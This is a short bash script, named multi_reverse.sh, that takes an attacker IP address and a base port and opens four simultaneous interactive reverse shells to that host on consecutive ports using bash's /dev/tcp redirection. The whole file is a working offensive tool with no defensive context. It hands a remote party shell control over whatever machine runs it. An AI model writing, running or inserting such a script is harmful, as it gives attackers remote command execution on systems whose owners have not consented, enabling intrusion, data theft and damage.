#!/bin/bash
# multi_reverse.sh - Establish multiple simultaneous reverse shells on sequential ports.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <base_port>"
  exit 1
fi
for offset in {0..3}
do
  port=$(($2 + $offset))
  echo "Launching reverse shell on port $port..."
  bash -c "bash -i >& /dev/tcp/$1/$port 0>&1" &
done
wait
echo "Multi reverse shell execution complete."
